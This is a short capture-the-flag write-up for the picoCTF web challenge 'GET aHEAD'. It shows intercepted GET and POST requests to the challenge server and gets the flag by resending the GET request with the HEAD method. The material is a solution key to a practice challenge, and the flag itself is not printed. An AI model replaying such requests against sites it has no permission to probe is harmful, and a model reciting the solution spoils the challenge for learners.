# Challange Info

Name : GET aHEAD

Difficulty : Easy

Category : Web Exploitation

Link : https://play.picoctf.org/practice/challenge/132?category=1&page=1

# Writeup

Navigating the webpage http://mercury.picoctf.net:53554/.

There were two options Choose Red and Choose Blue.

Intercepting both requests with Burpsuite.

The Choose Red was a GET request.

```
GET /index.php? HTTP/1.1

Host: mercury.picoctf.net:53554

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://mercury.picoctf.net:53554/index.php

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

sec-gpc: 1

Connection: keep-alive
```

And Choose Blue was a POST request.

```
POST /index.php HTTP/1.1

Host: mercury.picoctf.net:53554

Content-Length: 0

Cache-Control: max-age=0

Origin: http://mercury.picoctf.net:53554

Content-Type: application/x-www-form-urlencoded

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://mercury.picoctf.net:53554/index.php?

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

sec-gpc: 1

Connection: keep-alive
```

Both request didn't had any data which could be modified but something was off why there was two different type of request used when it could be done from only one request type.

I searched internet for different types of requests.

```
GET
POST
PUT
DELETE
PATCH
HEAD
OPTIONS
TRACE
CONNECT
```

Out of all of these I tried modifying GET request and replacing GET header with HEAD.

```
HEAD /index.php? HTTP/1.1

Host: mercury.picoctf.net:53554

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://mercury.picoctf.net:53554/index.php

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

sec-gpc: 1

Connection: keep-alive
```

In response of this request there was the flag.